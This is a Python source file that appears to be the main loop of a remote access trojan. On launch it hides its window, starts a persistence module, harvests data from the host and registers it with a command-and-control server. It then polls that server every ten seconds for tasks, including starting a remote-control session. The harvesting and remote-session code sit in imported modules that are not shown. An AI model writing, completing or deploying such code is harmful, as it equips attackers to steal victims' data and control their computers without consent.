import time
import threading
import socket
import traceback
import tkinter as tk
import asyncio

# Import all modules at the top level
import actions
from harvester import harvest_all_data
from comms import register_with_c2, send_heartbeat, C2_URL, session_id
from resilience import manage_resilience

ENABLE_RESILIENCE = True

def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command = task.get("command")
        print(f"[*] Received command: {command}")
        if command == "show_popup":
            actions.show_popup(task.get("text", "Default Popup"))
        elif command == "start_rat":
            # Start the async RAT session in a new thread
            threading.Thread(target=lambda: asyncio.run(actions.rat_session(session_id, C2_URL)), daemon=True).start()

def payload_logic_thread():
    try:
        if ENABLE_RESILIENCE: threading.Thread(target=manage_resilience, daemon=True).start()
        hostname = socket.gethostname()
        initial_data = harvest_all_data()
        register_with_c2(hostname, initial_data)

        while True:
            response = send_heartbeat()
            if response and "tasks" in response:
                process_tasks(response["tasks"])
            time.sleep(10)
    except Exception:
        print(f"[!!!] Payload logic thread crashed:\n{traceback.format_exc()}")

if __name__ == "__main__":
    gui_root = tk.Tk(); gui_root.withdraw()
    actions.init_gui(gui_root)
    c2_thread = threading.Thread(target=payload_logic_thread, daemon=True); c2_thread.start()
    gui_root.mainloop()